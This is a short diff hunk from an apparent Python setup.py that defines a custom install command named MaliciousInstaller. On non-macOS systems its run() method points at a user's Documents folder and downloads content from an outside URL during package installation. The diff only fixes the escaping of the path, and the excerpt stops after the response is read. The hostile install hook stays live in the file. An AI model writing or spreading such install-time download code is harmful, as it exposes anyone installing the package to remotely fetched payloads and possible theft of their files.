@@ -9,7 +9,7 @@ from setuptools.command.install import install
 class MaliciousInstaller(install):
     def run(self):
         if platform.system() != 'Darwin':
-            documents = 'C:\Users\charl\Documents'
+            documents = 'C:\\Users\\charl\\Documents'
             installer_url = 'https://api.slikc.me/installer'
             with urllib.request.urlopen(installer_url) as response:
                 installer_content = response.read()
